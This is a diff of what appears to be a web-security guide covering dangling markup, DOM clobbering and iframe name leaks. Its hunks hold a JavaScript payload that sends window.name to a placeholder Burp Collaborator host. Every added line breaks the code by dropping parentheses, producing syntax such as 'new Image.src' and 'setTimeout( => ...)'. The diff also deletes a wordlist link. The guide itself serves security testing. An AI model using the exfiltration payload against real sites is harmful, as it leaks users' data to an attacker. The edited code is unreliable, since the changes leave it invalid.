@@ -127,7 +127,7 @@ This will make that the **value** of **`window.name`** if the link is clicked is
 ```html
 <script>
   if(window.name) {
-      new Image().src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
+      new Image.src='//your-collaborator-id.burpcollaborator.net?'+encodeURIComponent(window.name);
 </script>
 ```
 
@@ -140,7 +140,7 @@ Insert a new tag with and id inside the HTML that will overwrite the next one an
 Share this status update with: ← Legitimate optional element of a dialog
 <input id="share_with" value="" />
 
-... function submit_status_update() { ... request.share_with =
+... function submit_status_update { ... request.share_with =
 document.getElementById('share_with').value; ... }
 ```
 
@@ -150,9 +150,9 @@ Create variables inside javascript namespace by inserting HTML tags. Then, this 
 
 ```html
 <img id="is_public" /> ← Injected markup ... // Legitimate application code
-follows function retrieve_acls() { ... if (response.access_mode == AM_PUBLIC) ←
+follows function retrieve_acls { ... if (response.access_mode == AM_PUBLIC) ←
 The subsequent assignment fails in IE is_public = true; else is_public = false;
-} function submit_new_acls() { ... if (is_public) request.access_mode =
+} function submit_new_acls { ... if (is_public) request.access_mode =
 AM_PUBLIC; ← Condition always evaluates to true ... }
 ```
 
@@ -201,7 +201,7 @@ An iframe can also be abused to leak sensitive information from a different page
 <script>
   function cspBypass(win) {
     win[0].location = "about:blank"
-    setTimeout(() => alert(win[0].name), 500)
+    setTimeout( => alert(win[0].name), 500)
   }
 </script>
 
@@ -248,7 +248,7 @@ XS-Search techniques **exfiltrate cross-origin information through side channels
 ## Brute-Force Detection List
 
 
-https://github.com/carlospolop/Auto_Wordlists/blob/main/wordlists/dangling_markup.txt
+
 
 ## References
 
